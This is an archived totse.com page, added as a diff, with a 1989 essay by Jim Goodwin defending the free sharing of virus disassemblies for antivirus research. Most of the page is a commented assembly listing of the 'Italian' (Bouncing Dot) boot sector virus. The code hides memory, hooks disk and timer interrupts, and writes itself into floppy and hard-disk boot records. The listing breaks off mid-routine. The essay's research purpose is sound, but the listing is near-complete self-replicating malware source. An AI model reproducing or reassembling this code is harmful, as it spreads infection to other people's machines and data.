@@ -1,0 +1,3782 @@
+<html>
+<head>
+<title>totse.com | A Analysis of Computer Virus Structures</title>
+<link rel="shortcut icon" href="../../../favicon.ico">
+<link rel="stylesheet" href="../../../styles/totse3.css">
+<script>const SITE_PREFIX = "../../../";</script>
+<script src="../../../assets/ads.js"></script>
+<script src="../../../assets/hot_topics.js"></script>
+</head>
+
+<body background="../../../images/t3/bg.jpg" bgcolor="#2D3856" text="#000000" link="#FFFFFF" vlink="#FFFFFF" alink="#F5F5F5" leftmargin="5" topmargin="5">
+
+<!-- Top of page table -->
+<table width="100%" border="0" cellpadding="0" cellspacing="0">
+	<tr valign="center">
+		<td width="43%" align="left">
+			<img src="../../../images/t3/logos/totse01.gif" border="0" width="358" height="43">
+		</td>
+		<td width="2%">&nbsp;</td>
+		<td width="55%" align="right">
+			<!-- Top banner ad slot - filled client-side from the recovered original ad images -->
+			<div class="bannertext"><img id="ad-slot-top" src="" alt="" border="1" style="display:none;"></div>
+		</td>
+	</tr>
+</table>
+
+<table width="100%" border="0" cellpadding="0" cellspacing="0">
+	<tr valign="top">
+
+		<!-- Left side navigation tabs -->
+		<td align="right" width="157">
+			<table width="157" border="0" cellpadding="0" cellspacing="0">
+				<tr><td height="50"><img src="../../../images/t3/0.gif"></td></tr>
+			</table>
+						<table width="157" border="0" cellpadding="0" cellspacing="0">
+							<tr>
+								<td width="13" height="11" background="../../../images/t3/1lt.jpg"><img src="../../../images/t3/0.gif"></td>
+								<td width="144" height="11" background="../../../images/t3/1ct.jpg"><img src="../../../images/t3/0.gif"></td>
+							</tr>
+							<tr>
+								<td width="13" background="../../../images/t3/1lm.jpg"><img src="../../../images/t3/0.gif"></td>
+								<td width="144" background="../../../images/t3/1cm.jpg">
+									<a href="../../../#" target="_top" class="sinactive">About</a>
+								</td>
+							</tr>
+							<tr>
+								<td width="13" height="17" background="../../../images/t3/1lb.jpg"><img src="../../../images/t3/0.gif"></td>
+								<td width="144" height="17" background="../../../images/t3/1cb.jpg"><img src="../../../images/t3/0.gif"></td>
+							</tr>
+						</table>
+						<table width="157" border="0" cellpadding="0" cellspacing="0">
+							<tr>
+								<td width="13" height="11" background="../../../images/t3/1lt.jpg"><img src="../../../images/t3/0.gif"></td>
+								<td width="144" height="11" background="../../../images/t3/1ct.jpg"><img src="../../../images/t3/0.gif"></td>
+							</tr>
+							<tr>
+								<td width="13" background="../../../images/t3/1lm.jpg"><img src="../../../images/t3/0.gif"></td>
+								<td width="144" background="../../../images/t3/1cm.jpg">
+									<a href="../../../#" target="_top" class="sinactive">Community</a>
+								</td>
+							</tr>
+							<tr>
+								<td width="13" height="17" background="../../../images/t3/1lb.jpg"><img src="../../../images/t3/0.gif"></td>
+								<td width="144" height="17" background="../../../images/t3/1cb.jpg"><img src="../../../images/t3/0.gif"></td>
+							</tr>
+						</table>
+						<table width="157" border="0" cellpadding="0" cellspacing="0">
+							<tr>
+								<td width="13" height="11" background="../../../images/t3/1lt.jpg"><img src="../../../images/t3/0.gif"></td>
+								<td width="144" height="11" background="../../../images/t3/1ct.jpg"><img src="../../../images/t3/0.gif"></td>
+							</tr>
+							<tr>
+								<td width="13" background="../../../images/t3/1lm.jpg"><img src="../../../images/t3/0.gif"></td>
+								<td width="144" background="../../../images/t3/1cm.jpg">
+									<a href="../../../#" target="_top" class="sinactive">Art</a>
+								</td>
+							</tr>
+							<tr>
+								<td width="13" height="17" background="../../../images/t3/1lb.jpg"><img src="../../../images/t3/0.gif"></td>
+								<td width="144" height="17" background="../../../images/t3/1cb.jpg"><img src="../../../images/t3/0.gif"></td>
+							</tr>
+						</table>
+						<table width="157" border="0" cellpadding="0" cellspacing="0">
+							<tr>
+								<td width="13" height="11" background="../../../images/t3/1lt.jpg"><img src="../../../images/t3/0.gif"></td>
+								<td width="144" height="11" background="../../../images/t3/1ct.jpg"><img src="../../../images/t3/0.gif"></td>
+							</tr>
+							<tr>
+								<td width="13" background="../../../images/t3/1lm.jpg"><img src="../../../images/t3/0.gif"></td>
+								<td width="144" background="../../../images/t3/1cm.jpg">
+									<a href="../../../#" target="_top" class="sinactive">Carnality</a>
+								</td>
+							</tr>
+							<tr>
+								<td width="13" height="17" background="../../../images/t3/1lb.jpg"><img src="../../../images/t3/0.gif"></td>
+								<td width="144" height="17" background="../../../images/t3/1cb.jpg"><img src="../../../images/t3/0.gif"></td>
+							</tr>
+						</table>
+						<table width="157" border="0" cellpadding="0" cellspacing="0">
+							<tr>
+								<td width="13" height="11" background="../../../images/t3/1lt.jpg"><img src="../../../images/t3/0.gif"></td>
+								<td width="144" height="11" background="../../../images/t3/1ct.jpg"><img src="../../../images/t3/0.gif"></td>
+							</tr>
+							<tr>
+								<td width="13" background="../../../images/t3/1lm.jpg"><img src="../../../images/t3/0.gif"></td>
+								<td width="144" background="../../../images/t3/1cm.jpg">
+									<a href="../../../#" target="_top" class="sinactive">Entertainment</a>
+								</td>
+							</tr>
+							<tr>
+								<td width="13" height="17" background="../../../images/t3/1lb.jpg"><img src="../../../images/t3/0.gif"></td>
+								<td width="144" height="17" background="../../../images/t3/1cb.jpg"><img src="../../../images/t3/0.gif"></td>
+							</tr>
+						</table>
+						<table width="157" border="0" cellpadding="0" cellspacing="0">
+							<tr>
+								<td width="13" height="11" background="../../../images/t3/1lt.jpg"><img src="../../../images/t3/0.gif"></td>
+								<td width="144" height="11" background="../../../images/t3/1ct.jpg"><img src="../../../images/t3/0.gif"></td>
+							</tr>
+							<tr>
+								<td width="13" background="../../../images/t3/1lm.jpg"><img src="../../../images/t3/0.gif"></td>
+								<td width="144" background="../../../images/t3/1cm.jpg">
+									<a href="../../../#" target="_top" class="sinactive">Science</a>
+								</td>
+							</tr>
+							<tr>
+								<td width="13" height="17" background="../../../images/t3/1lb.jpg"><img src="../../../images/t3/0.gif"></td>
+								<td width="144" height="17" background="../../../images/t3/1cb.jpg"><img src="../../../images/t3/0.gif"></td>
+							</tr>
+						</table>
+						<table width="157" border="0" cellpadding="0" cellspacing="0">
+							<tr>
+								<td width="13" height="11" background="../../../images/t3/1lt.jpg"><img src="../../../images/t3/0.gif"></td>
+								<td width="144" height="11" background="../../../images/t3/1ct.jpg"><img src="../../../images/t3/0.gif"></td>
+							</tr>
+							<tr>
+								<td width="13" background="../../../images/t3/1lm.jpg"><img src="../../../images/t3/0.gif"></td>
+								<td width="144" background="../../../images/t3/1cm.jpg">
+									<a href="../../../#" target="_top" class="sinactive">Society</a>
+								</td>
+							</tr>
+							<tr>
+								<td width="13" height="17" background="../../../images/t3/1lb.jpg"><img src="../../../images/t3/0.gif"></td>
+								<td width="144" height="17" background="../../../images/t3/1cb.jpg"><img src="../../../images/t3/0.gif"></td>
+							</tr>
+						</table>
+						<table width="157" border="0" cellpadding="0" cellspacing="0">
+							<tr>
+								<td width="13" height="11" background="../../../images/t3/0lt.jpg"><img src="../../../images/t3/0.gif"></td>
+								<td width="144" height="11" background="../../../images/t3/0ct.jpg"><img src="../../../images/t3/0.gif"></td>
+							</tr>
+							<tr>
+								<td width="13" height="15" background="../../../images/t3/0lm.jpg"><img src="../../../images/t3/0.gif"></td>
+								<td width="144" height="15" background="../../../images/t3/0cm.jpg">
+									<span class="sactive">Technology</span>
+								</td>
+							</tr>
+							<tr>
+								<td width="13" height="17" background="../../../images/t3/0lb.jpg"><img src="../../../images/t3/0.gif"></td>
+								<td width="144" height="17" background="../../../images/t3/0cb.jpg"><img src="../../../images/t3/0.gif"></td>
+							</tr>
+						</table>
+
+		</td>
+
+		<!-- Content column -->
+		<td align="left">
+			<table width="100%" border="0" cellpadding="0" cellspacing="0">
+
+				<tr>
+					<td width="13" height="11" background="../../../images/t3/3lt.jpg"><img src="../../../images/t3/0.gif"></td>
+					<td width="97%" height="11" background="../../../images/t3/3ct.jpg"><img src="../../../images/t3/0.gif"></td>
+					<td width="13" height="11" background="../../../images/t3/3rt.jpg"><img src="../../../images/t3/0.gif"></td>
+				</tr>
+
+				<!-- Ubiquitous nav menu - placeholders for now, real targets get wired up once we rebuild these sections -->
+				<tr>
+					<td width="13" height="11" background="../../../images/t3/3lm.jpg"><img src="../../../images/t3/0.gif"></td>
+					<td width="97%" height="11" background="../../../images/t3/3cm.jpg" align="right">
+						<span class="navtoppipe">
+							<a href="../../../#" class="navtop">register</a> |
+							<a href="../../../#" class="navtop">bbs</a> |
+							<a href="../../../#" class="navtop">search</a> |
+							<a href="../../../#" class="navtop">rss</a> |
+							<a href="../../../#" class="navtop">faq</a> |
+							<a href="../../../#" class="navtop">about</a>
+						</span>
+					</td>
+					<td width="13" height="11" background="../../../images/t3/3rm.jpg"><img src="../../../images/t3/0.gif"></td>
+				</tr>
+				<tr>
+					<td width="13" height="11" background="../../../images/t3/3lm.jpg"><img src="../../../images/t3/0.gif"></td>
+					<td width="97%" height="11" background="../../../images/t3/3cm.jpg" align="right">
+						<span class="navtoppipe">
+							<a href="../../../#" class="navtop">meet up</a> |
+							<a href="../../../#" class="navtop">add to del.icio.us</a> |
+							<a href="../../../#" class="navtop">digg it</a>
+						</span>
+					</td>
+					<td width="13" height="11" background="../../../images/t3/3rm.jpg"><img src="../../../images/t3/0.gif"></td>
+				</tr>
+
+				<tr valign="top">
+					<td width="13" background="../../../images/t3/0cm.jpg"><img src="../../../images/t3/0.gif"></td>
+					<td width="97%" height="640" background="../../../images/t3/0cm.jpg">
+<h1>A Analysis of Computer Virus Structures</h1>
+
+<div class="disclaim"><hr>
+NOTICE: TO ALL CONCERNED Certain text files and messages contained on this site deal with activities and devices which would be in violation of various Federal, State, and local laws if actually carried out or constructed. The webmasters of this site do not advocate the breaking of any law. Our text files and message bases are for informational purposes only. We recommend that you contact your local law enforcement officials before undertaking any project based upon any information obtained from this or any other web site. We do not guarantee that any of the information contained on this system is correct, workable, or factual. We are not responsible for, nor do we assume any liability for, damages resulting from the use of any information on this site. 
+<hr></div>
+
+The following document is copyrighted by Jim Goodwin, 1989.  It may be<br>
+copied and distributed freely, as long as no changes are made.  For further<br>
+information or comments, I may be contacted on the Bulletin Board Society's<br>
+Homebase board - (408) 988 4004.  Additional virus analyses are currently<br>
+being finalized and the results will be published in future versions of this<br>
+document.  <br>
+Jim Goodwin - April 7, 1989 <br>
+<br>
+<br>
+AN ANALYSIS OF COMPUTER VIRUS STRUCTURES<br>
+<br>
+There has been much disagreement within the virus research community<br>
+about the wisdom of distributing detailed information about viruses,<br>
+including disassemblies of viruses.  Some would say that virus disassemblies<br>
+can be easily re-assembled and returned to a live state; that they show<br>
+people how to write viruses or that they give people ideas that they would<br>
+not otherwise have.  The opposing view holds that detailed information must<br>
+be shared freely in order to effectively combat the virus spread.  Proponents<br>
+of shared information point out that hundreds of people are re-inventing the<br>
+wheel by disassembling viruses that have already been disassembled many<br>
+times over.  They argue that it does not take a disassembly to enable someone<br>
+to write a virus; that anyone with even a moderate understanding of<br>
+programming can do so, and that live viruses are so common that anyone<br>
+wishing to obtain one can easily get their hands on one.<br>
+I very strongly favor the free information viewpoint.  It is clear that<br>
+we, as a user community, are suffering greatly from a lack of concrete<br>
+knowledge.  PC Magazine, as the prime example of this lack of knowledge,<br>
+performed an evaluation of antiviral products in its April issue that is<br>
+shocking to anyone with even a remote understanding of viruses.  The products<br>
+chosen were the TSR type of prevention products (Class I products in CVIA<br>
+terminology), and these products are universally known to be practically<br>
+useless.  They were tested against only three viruses, none of them boot<br>
+sector infectors (since TSR type products cannot possibly prevent such<br>
+infections), in spite of the fact that boot infectors account for over 75%<br>
+of all infection occurrences.  The editor's choice was Flu-shot and, while<br>
+I have nothing against Greenberg or his programming skills, the product, like<br>
+all TSRs, is almost completely ineffective.  Even a child could write a virus<br>
+to evade the interrupt vectoring capabilities of TSRs in a DOS environment. <br>
+These and other circumstances make it obvious that we are in desperate need<br>
+of education.<br>
+I have disassembled dozens of viruses, and I now know that it takes no<br>
+specialized knowledge to write a virus.  Literally anyone can write one.  The<br>
+concept is absurdly simple, understood by even beginning programmers.  We<br>
+have merely surrounded the virus issue with an air of mystique that makes it<br>
+appear that there is some magic formula that must be guarded from the crowd<br>
+of people waiting to write viruses.  This is total nonsense.  There is no<br>
+magic.  There is no subtlety.  A program is merely written that copies itself<br>
+and attaches itself to another program.  If this is the secret we are trying<br>
+to protect, then we have become foolish.<br>
+The truth is, we need to study and disseminate existing virus structures<br>
+far more than we need to hide them from crackers.  A cracker gains little<br>
+from a disassembly.  A researcher attempting to write a disinfectant program,<br>
+on the other hand, gains a great deal.  The cracker is the only person who<br>
+gains from the existing atmosphere of restricted information flow.  If few<br>
+people know the internals of a virus, then there is little likelihood that<br>
+an effective remedy for the virus will be forthcoming.  If many people have<br>
+access, then one or more will certainly develop an identification and removal<br>
+product.<br>
+I also want to point out that full virus disassemblies have previously<br>
+been published in at least three books and  four international magazines with<br>
+no known ill effects, and a great deal of positive support from readers.<br>
+I do not expect the previous brief discussion will change the minds of<br>
+those people who insist on a restricted flow of detailed information.  I do<br>
+hope, however, that those of you who have been shy about your own desires to<br>
+open up and share information, will take heart and pass on the enclosed<br>
+disassemblies to those people that you feel might benefit from them.<br>
+I would like to take this opportunity to give my heartfelt thanks to<br>
+John McAfee (who mildly disagrees with my approach) for his tireless efforts<br>
+to collect and classify viruses from multiple computer architectures.  His<br>
+work, more than any others, has inspired me to give my all to this effort. <br>
+I would also like to recognize the excellent collective work of the Computer<br>
+Virus Industry Association, for their concise analysis of antiviral measures<br>
+and their overwhelming contribution to my collection of 60 odd viruses. <br>
+Neither John nor the Association, by the way, is in any way responsible for<br>
+my publication and distribution of this document.  I take sole and full<br>
+responsibility.<br>
+<br>
+<br>
+THE VIRUSES<br>
+<br>
+*************************************************************************<br>
+-------------------------------------------------------------------------<br>
+-------------------------------------------------------------------------<br>
+*************************************************************************<br>
+<br>
+The "Italian Virus"<br>
+Also Called - Bouncing Dot, Vera Cruz and Missouri virus.<br>
+<br>
+; ORIGININ ADDRESS -7C00H <br>
+<br>
+RAM   SEGMENT AT 0<br>
+<br>
+; SYSTEM DATA<br>
+<br>
+ORG   20H<br>
+INT8OF   DW ?        ; INTERRUPT 8 OFFSET<br>
+INT8SG   DW ?        ; INTERRUPT 8 SEGMENT<br>
+ORG   4CH<br>
+INT19O   DW ?        ; INTERRUPT 19 OFFSET<br>
+INT19S   DW ?        ; INTERRUPT 19 SEGMENT<br>
+ORG   413H<br>
+RAMSIZ   DW ?        ; TOTAL RAM SIZE<br>
+<br>
+; BPB OF VIRUS BOOT RECORD<br>
+<br>
+ORG   7C0BH<br>
+BYPSEC   DW ?        ; BYTES PER SECTOR<br>
+NUMSEC   DB ?        ; SECTORS PER ALLOCATION UNIT<br>
+SECRES   DW ?        ; RESERVED SECTORS<br>
+FATNUM   DB ?        ; NUMBER OF FATS<br>
+DIRNUM   DW ?        ; NUMBER OF ROOT DIR ENTRIES<br>
+SECNUM   DW ?        ; NUMBER OF SECTORS<br>
+MEDIAD   DB ?        ; MEDIA DESCRIPTOR<br>
+SECFAT   DW ?        ; NUMBER OF SECTORS PER FAT<br>
+SECTRK   DW ?        ; SECTORS PER TRACK<br>
+HEDNUM   DW ?        ; NUMBER OF HEADS<br>
+HIDSEC   DW ?        ; NUMBER OF HIDDEN SECTORS (LOW ORDER)<br>
+<br>
+; INTERRUPT 19 (13H) BRANCH ADDRESS<br>
+<br>
+ORG   7D2AH<br>
+<br>
+ORIG19   DW ?        ; ORIGINAL INT 19 OFFSET<br>
+ORG19S   DW ?        ; ORIGINAL INT 19 SEGMENT<br>
+<br>
+; INSTALLATION DATA AREA<br>
+<br>
+ORG   7DF3H<br>
+CURFAT   DW ?     ; CURRENT FAT <br>
+CURCLS   DW ?     ; SECTOR NUMBER OF FIRST CLUSTER<br>
+SWITCH   DB ?     ; SWITCHES<br>
+;          - 01H - NESTED INTERRUPT<br>
+;          - 02H - TIMER INTERRUPT <br>
+;          - 04H - 16-BIT FAT<br>
+LSTDRV   DB ?     ; LAST DRIVE USED<br>
+REMAIN   DW ?     ; SECTOR NUMBER OF REST OF CODE<br>
+RESERV   DB ?     ; RESERVED SPACE FOR FUTURE HACKING<br>
+FLAG01   DW ?     ; FLAG FIELD<br>
+<br>
+; DATA AREA<br>
+<br>
+ORG   7EB0H<br>
+LASTTM   DW ?        ; SYSTEM TIME LAST CALLED<br>
+PRCFAT   DB ?        ; PROCESSED FAT / 256<br>
+<br>
+; INTERRUPT 8 BRANCH ADDRESS<br>
+<br>
+ORG   7FC9H<br>
+ORG08O   DW ?        ; ORIGINAL INT 8 OFFSET<br>
+ORG08S   DW ?        ; ORIGINAL INT 8 SEGMENT<br>
+<br>
+; DISPLAY DATA AREA<br>
+<br>
+ORG   7FCDH<br>
+CHARAT   DW ?        ; CHARACTER AND ATTRIBUTES<br>
+ROWCOL   DW ?        ; ROW AND COLUMN POSITIONS<br>
+ROWCLM   DW ?        ; ROW AND COLUMN MOVEMENT<br>
+GRAPHM   DB ?        ; GRAPHICS MODE SWITCH<br>
+MODEAP   DW ?        ; MODE AND ACTIVE PAGE<br>
+COLUMN   DB ?        ; VISIBLE COLUMNS - 1<br>
+<br>
+; BPB OF ORIGINAL BOOT RECORD<br>
+<br>
+ORG   800BH<br>
+BIPSEC   DW ?        ; BYTES PER SECTOR<br>
+ALCSEC   DB ?        ; SECTORS PER ALLOCATION UNIT<br>
+VERVED   DW ?        ; RESERVED SECTORS<br>
+RUMNUM   DB ?        ; NUMBER OF FATS<br>
+ROTRID   DW ?        ; NUMBER OF ROOT DIR ENTRIES<br>
+NUOSEC   DW ?        ; NUMBER OF SECTORS<br>
+MIASET   DB ?        ; MEDIA DESCRIPTOR<br>
+FASNUM   DW ?        ; NUMBER OF SECTORS PER FAT<br>
+TRASSC   DW ?        ; SECTORS PER TRACK<br>
+NUOHED   DW ?        ; NUMBER OF HEADS<br>
+HIDESC   DW ?        ; NUMBER OF HIDDEN SECTORS (LOW ORDER)<br>
+<br>
+ORG   81F5H<br>
+FSTCLS   DW ?        ; SECTOR NUMBER OF FIRST CLUSTER<br>
+SWITCB   DB ?        ; SWITCHES - 01H - NESTED INTERRUPT<br>
+;             - 02H - TIMER INTERRUPT INSTALLED<br>
+;             - 04H - 16-BIT FAT<br>
+LASTUS   DB ?        ; DRIVE LAST USED<br>
+REMAI2   DW ?        ; SECTOR NUMBER OF REST OF CODE<br>
+LATER2   DB ?        ; TYPE SWITCH<br>
+LATER3   DW 2 DUP (?)	 ; INSTALLED.. HMMM?<br>
+<br>
+RAM   ENDS<br>
+<br>
+CODE  SEGMENT BYTE PUBLIC 'CODE'<br>
+ASSUME CS:CODE,DS:RAM<br>
+<br>
+START:  <br>
+JMP   HIDE_ME_PLEASE      ; BRANCH ROUND BPB TABLE<br>
+<br>
+DB 'MSDOS3.2'     ; OEM AND VERSION<br>
+<br>
+DW 512      ; BYPSEC - BYTES PER SECTOR<br>
+DB 2        ; NUMSEC - SECTORS PER ALLOCATION UNIT<br>
+DW 1        ; SECRES - RESERVED SECTORS<br>
+DB 2        ; FATNUM - NUMBER OF FATS<br>
+DW 112      ; DIRNUM - NUMBER OF ROOT DIR ENTRIES<br>
+DW 720      ; SECNUM - NUMBER OF SECTORS<br>
+DB 0FDH     ; MEDIAD - MEDIA DESCRIPTOR<br>
+DW 2        ; SECFAT - NUMBER OF SECTORS PER FAT<br>
+DW 9        ; SECTRK - SECTORS PER TRACK<br>
+DW 2        ; HEDNUM - NUMBER OF HEADS<br>
+DW 0        ; HIDSEC - NUMBER OF HIDDEN SECTORS (LOW ORDER)<br>
+<br>
+; START OF PROCESSING<br>
+<br>
+; HIDE 2K OF RAM FROM SYSTEM AND MOVE INTO THIS HIDDEN AREA<br>
+<br>
+HIDE_ME_PLEASE: <br>
+XOR   AX,AX<br>
+MOV   SS,AX       ; STACK SEGMENT ZERO<br>
+MOV   SP,7C00H    ; SET STACK POINTER TO START OF BUFFER<br>
+MOV   DS,AX       ; DATA SEGMENT ZERO<br>
+MOV   AX,RAMSIZ   ; GET TOTAL RAM SIZE<br>
+SUB   AX,2        ; SUBTRACT 2K<br>
+MOV   RAMSIZ,AX   ; REPLACE AMENDED RAM SIZE<br>
+MOV   CL,6        ; NUMBER OF POSITIONS TO SHIFT<br>
+SHL   AX,CL       ; MULTIPLY RAM SIZE BY 64 (SEGMENT ADDRESS)<br>
+SUB   AX,7C0H     ; SUBTRACT BUFFER OFFSET<br>
+MOV   ES,AX       ; SET TARGET SEGMENT ADDRESS<br>
+MOV   SI,7C00H    ; LOAD BUFFER TARGET OFFSET<br>
+MOV   DI,SI       ; COPY OFFSET FOR SOURCE<br>
+MOV   CX,0100H    ; NUMBER OF WORDS TO MOVE<br>
+REPZ  MOVSW       ; DUPLICATE BOOT SECTOR IN HIGH STORAGE<br>
+;  MOV   CS,AX       ; LOAD SEGMENT OF NEW LOCATION<br>
+; THIS IS THE ILLEGAL OPCODE!<br>
+DB 08EH, 0C8H     ; PREVIOUS COMMAND HARD CODED<br>
+<br>
+; FROM THIS POINT ON WILL BE RUNNING IN HIGH STORAGE<br>
+<br>
+PUSH  CS             ; \ SET DS EQUAL TO CS<br>
+POP   DS             ; /<br>
+CALL  SET_IT_UP<br>
+SET_IT_UP: <br>
+XOR   AH,AH          ; INITIALISE DISK SUB-SYSTEM<br>
+INT   13H            ; DISK INTERRUPT<br>
+AND   LSTDRV,80H     ; SET ADDRESS FOR HARD DISK<br>
+MOV   BX,REMAIN      ; GET SECTOR OF REST OF CODE<br>
+PUSH  CS             ; \ GET CURRENT SEGMENT<br>
+POP   AX             ; /<br>
+SUB   AX,20H         ; ADDRESS BACK ONE SECTOR<br>
+MOV   ES,AX          ; SET BUFFER SEGMENT FOR REST OF CODE<br>
+CALL  READ_IT_IN         ; READ REST OF CODE<br>
+MOV   BX,REMAIN      ; GET SECTOR OF REST OF CODE<br>
+INC   BX             ; ADDRESS TO BOOT SECTOR STORE<br>
+MOV   AX,0FFC0H      ; WRAP-AROUND ADDRESS (= -400H)<br>
+MOV   ES,AX          ; SET BUFFER SEGMENT FOR BOOT SECTOR<br>
+CALL  READ_IT_IN         ; READ REAL BOOT SECTOR<br>
+XOR   AX,AX<br>
+MOV   SWITCH,AL      ; SET OFF ALL SWITCHES<br>
+MOV   DS,AX          ; DATA SEGMENT ZERO<br>
+MOV   AX,INT19O      ; SAVE INT 19 OFFSET<br>
+MOV   BX,INT19S      ; SAVE INT 19 SEGMENT<br>
+MOV   INT19O,OFFSET INT_19+7C00H ; NEW INT 19 OFFSET<br>
+MOV   INT19S,CS      ; NEW INT 19 SEGMENT<br>
+PUSH  CS             ; \ SET DS EQUAL TO CS<br>
+POP   DS             ; /<br>
+MOV   ORIG19,AX      ; STORE OLD INT 19 OFFSET<br>
+MOV   ORG19S,BX      ; STORE OLD INT 19 SEGMENT<br>
+MOV   DL,LSTDRV      ; GET DRIVE NUMBER<br>
+DB 0EAH              ; FAR JUMP TO BOOT SECTOR<br>
+DW 7C00H, 0<br>
+<br>
+WRITE_IT_OUT: <br>
+MOV   AX,301H     ; WRITE ONE SECTOR<br>
+JMP   SHORT GET_SECTOR<br>
+<br>
+READ_IT_IN: <br>
+MOV   AX,201H     ; READ ONE SECTOR<br>
+GET_SECTOR: <br>
+XCHG  BX,AX       ; MOVE SECTOR NUMBER TO AX<br>
+ADD   AX,HIDSEC   ; ADD HIDDEN SECTORS<br>
+XOR   DX,DX       ; CLEAR FOR DIVISION<br>
+DIV   SECTRK      ; DIVIDE BY SECTORS PER TRACK<br>
+INC   DL          ; ADD ONE TO ODD SECTORS<br>
+MOV   CH,DL       ; SAVE SECTOR NUMBER<br>
+XOR   DX,DX       ; CLEAR FOR DIVISION<br>
+DIV   HEDNUM      ; DIVIDE BY NUMBER OF HEADS<br>
+MOV   CL,6        ; POSITIONS TO MOVE<br>
+SHL   AH,CL       ; MOVE TOP TWO BITS OF TRACK<br>
+OR    AH,CH       ; MOVE IN SECTOR NUMBER<br>
+MOV   CX,AX       ; MOVE TO CORRECT REGISTER<br>
+XCHG  CH,CL       ; ..AND CORRECT POSITION IN REG<br>
+MOV   DH,DL       ; MOVE HEAD NUMBER<br>
+MOV   AX,BX       ; RECOVER CONTENTS OF AX<br>
+BRING_IN: <br>
+MOV   DL,LSTDRV   ; GET DRIVE NUMBER<br>
+MOV   BX,8000H    ; SET BUFFER ADDRESS<br>
+INT   13H         ; DISK INTERRUPT<br>
+JNB   GO_BACK     ; BRANCH IF NO ERRORS<br>
+POP   AX<br>
+GO_BACK:<br>
+RET<br>
+<br>
+; INTERRUPT 19 (13H) (DISK) ROUTINE<br>
+<br>
+INT_19: <br>
+PUSH  DS<br>
+PUSH  ES<br>
+PUSH  AX<br>
+PUSH  BX<br>
+PUSH  CX<br>
+PUSH  DX<br>
+PUSH  CS             ; \ SET DS EQUAL TO CS<br>
+POP   DS             ; /<br>
+PUSH  CS             ; \ SET ES EQUAL TO CS<br>
+POP   ES             ; /<br>
+TEST  SWITCH,1       ; TEST NESTED INTERRUPT SWITCH<br>
+JNZ   PASS_OUT         ; EXIT IF ON<br>
+CMP   AH,2           ; TEST FOR READ SECTOR<br>
+JNZ   PASS_OUT         ; EXIT IF NOT<br>
+CMP   LSTDRV,DL      ; COMPARE DRIVE NUMBER<br>
+MOV   LSTDRV,DL      ; SAVE DRIVE NUMBER<br>
+JNZ   INT_SWITCH         ; BRANCH IF DIFFERENT THIS TIME<br>
+<br>
+; THIS IS THE ACTIVATION CODE.  IT HAS A 'WINDOW' OF JUST LESS<br>
+; THAN A SECOND, APPROXIMATELY EVERY HALF HOUR, DURING WHICH<br>
+; TIME A DISK-READ WILL SWITCH IT ON.<br>
+<br>
+XOR   AH,AH          ; GET SYSTEM CLOCK<br>
+INT   1AH            ; SYSTEM CLOCK INTERRUPT<br>
+TEST  DH,7FH         ; TEST LOW WORD HIGH BYTE<br>
+JNZ   DO_TIME<br>
+TEST  DL,0F0H        ; TEST LOW WORD LOW BYTE<br>
+JNZ   DO_TIME<br>
+PUSH  DX             ; SAVE SYSTEM TIME<br>
+CALL  INTERRUPT_08         ; INSTALL SYSTEM CLOCK ROUTINE<br>
+POP   DX             ; RECOVER SYSTEM TIME<br>
+DO_TIME: <br>
+MOV   CX,DX          ; COPY SYSTEM TIME<br>
+SUB   DX,LASTTM      ; INTERVAL SINCE LAST CALL<br>
+MOV   LASTTM,CX      ; SAVE SYSTEM TIME<br>
+SUB   DX,24H         ; SUBTRACT 2 SECONDS<br>
+JB    PASS_OUT         ; RETURN IF LESS THAN TWO SECONDS<br>
+INT_SWITCH: <br>
+OR SWITCH,1          ; SET ON NESTED INTERRUPT SWITCH<br>
+PUSH  SI<br>
+PUSH  DI<br>
+CALL  DISK_INSTALL         ; INSTALL ON DISK<br>
+POP   DI<br>
+POP   SI<br>
+AND   SWITCH,0FEH    ; SET OFF NESTED INTERRUPT SWITCH<br>
+PASS_OUT: <br>
+POP   DX<br>
+POP   CX<br>
+POP   BX<br>
+POP   AX<br>
+POP   ES<br>
+POP   DS<br>
+DB 0EAH        ; FAR JUMP TO ORIGINAL INT 19<br>
+DW 01FBH       ; ORIG19 - ORIGINAL INT 19 OFFSET<br>
+DW 0C800H      ; ORG19S - ORIGINAL INT 19 SEGMENT<br>
+<br>
+; DISK INSTALLATION<br>
+<br>
+DISK_INSTALL: <br>
+MOV   AX,201H        ; READ ONE SECTOR<br>
+MOV   DH,0           ; HEAD NUMBER 0<br>
+MOV   CX,1           ; TRACK 0, SECTOR 1<br>
+CALL  BRING_IN         ; READ FIRST SECTOR FROM DISK<br>
+TEST  LSTDRV,80H     ; TEST FOR HARD DRIVE<br>
+JZ    FAT_CHECK         ; BRANCH IF NOT<br>
+<br>
+; HARD DISK - PARTITION TABLE<br>
+<br>
+MOV   SI,81BEH       ; ADDRESS TO PARTITION TABLE<br>
+MOV   CX,4           ; NUMBER OF ENTRIES IN TABLE<br>
+NEXT_PART_ENTRY: <br>
+CMP   BYTE PTR [SI+4],1 ; TEST FOR DOS 12-BIT FAT<br>
+JZ    SNARF_UP_THE_BOOT         ; BRANCH IF YES<br>
+CMP   BYTE PTR [SI+4],4 ; TEST FOR DOS 16-BIT FAT<br>
+JZ    SNARF_UP_THE_BOOT         ; BRANCH IF YES<br>
+ADD   SI,10H         ; ADDRESS TO NEXT ENTRY<br>
+LOOP  NEXT_PART_ENTRY         ; LOOP THROUGH TABLE<br>
+RET<br>
+<br>
+; HARD DISK - GET BOOT RECORD<br>
+<br>
+SNARF_UP_THE_BOOT: <br>
+MOV   DX,[SI]        ; GET HEAD NUMBER OF BOOT<br>
+MOV   CX,[SI+2]      ; GET TRACK AND SECTOR OF BOOT<br>
+MOV   AX,201H        ; READ ONE SECTOR<br>
+CALL  BRING_IN         ; GET BOOT SECTOR FOR PARTITION<br>
+<br>
+; BOOT SECTOR PROCESSING<br>
+<br>
+FAT_CHECK: <br>
+MOV   SI,8002H       ; ADDRESS TO BPB SOURCE<br>
+MOV   DI,7C02H       ; ADDRESS TO BPB TARGET<br>
+MOV   CX,1CH         ; LENGTH OF BPB<br>
+REPZ  MOVSB          ; COPY BPB<br>
+CMP   LATER3,1357H   ; IS VIRUS INSTALLED ALREADY<br>
+JNZ   WHERE_BE_THE_FAT         ; BRANCH IF NOT<br>
+CMP   LATER2,0<br>
+JNB   HEAD_EM_OUT<br>
+MOV   AX,FSTCLS      ; GET SECTOR NO OF FIRST CLUSTER<br>
+MOV   CURCLS,AX      ; SAVE IT<br>
+MOV   SI,REMAI2<br>
+JMP   PLACE_VIRUS<br>
+<br>
+HEAD_EM_OUT:  RET<br>
+<br>
+; CALCULATE LOCATION OF FAT AND FIRST CLUSTER<br>
+<br>
+WHERE_BE_THE_FAT: <br>
+CMP   BIPSEC,200H    ; SECTOR SIZE 512<br>
